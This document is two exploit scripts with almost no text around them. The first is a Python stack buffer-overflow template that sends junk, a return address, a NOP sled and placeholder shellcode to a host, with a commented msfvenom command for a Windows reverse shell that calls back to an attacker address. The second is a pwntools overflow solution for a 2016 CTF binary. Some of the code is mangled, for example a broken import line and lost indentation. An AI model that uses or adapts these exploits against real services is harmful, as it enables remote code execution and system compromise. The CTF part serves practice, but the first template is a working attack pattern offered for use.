```
#!/usr/bin/python
import sys,
socket
if len(sys.argv) < 2:
print "\nUsage: " + sys.argv[0] + " <HOST>\n"
sys.exit()
cmd = "HACKALLTHETHINGS"
#msfvenom -p windows/shell_reverse_tcp LHOST=IPADDRESS LPORT=443 EXITFUNC=thread -f c -a
#x86 --platform windows -b "\x00\x04\xac"---351 bytes
shellcode=("fubar")
junk = "A"*500 + "\x78\x56\x34\x12" + "\x90"*20 + shellcode + "C"*2000
end = "\r\n"
buffer = cmd + junk + end
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8000))
s.send(buffer)

```





with pwn tools

```
## Buffer overflow using Pwntools to exploit rev200-get_started @ 3dsctf-2k16
# @author intrd - http://dann.com.br/
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

from pwn import *

context(arch = 'i386', os = 'linux', endian = 'little', word_size = 32, log_level = 'debug')
#context(arch = 'i386', os = 'linux', endian = 'little', word_size = 32)

binary = './get_started'
p = process(binary,stdin=process.PTY)

# Remote
# HOST = '54.175.35.248'
# PORT = 8005
# p = remote(HOST, PORT)

tex=p.recv(timeout=0.5)
print tex

overflow = "a"*56
addr = 0x080489b8 
overflow += p32(addr)

print("[*] sending overflow..")
p.sendline(overflow)
print("[*] done.")

flag = p.recvall()
print("[*] output: " + flag)
p.clean()
p.close()
```



